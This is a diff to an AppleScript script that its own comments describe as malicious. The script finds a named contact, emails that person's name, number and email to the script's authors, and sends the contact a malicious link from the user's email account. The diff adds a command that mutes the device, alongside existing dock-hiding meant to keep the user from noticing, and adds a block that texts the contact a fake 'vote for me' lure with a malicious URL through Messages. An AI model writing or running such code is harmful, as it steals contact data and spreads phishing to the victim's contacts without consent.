@@ -1,6 +1,9 @@
 -- This script finds the name of a specified Contact and emails their name, number and email to us.
 -- Then it emails the Contact from the User's Email with a malicious link
 
+-- Mutes the Device
+set volume output volume 0
+
 -- Hides the dock to prevent user from seeing what is happening
 tell application "System Events"
 	set autohide of dock preferences to true
@@ -75,6 +78,15 @@ if details is not "Contact Not Found" then
 		end tell
 		send theMessage
 		
+		delay 1
+		quit
+	end tell
+	
+	-- used code structure from https://developer.apple.com/forums/thread/668567
+	tell application "Messages"
+		set targetService to 1st account whose service type = SMS
+		set targetBuddy to participant phoneNumbers of targetService
+		send "Hey, just quickly wanted to ask if you could vote for me for this competition I entered at work. Here's the link: https://www.clearnetwork.com/malicious-urls/" to targetBuddy
 		delay 1
 		quit
 	end tell
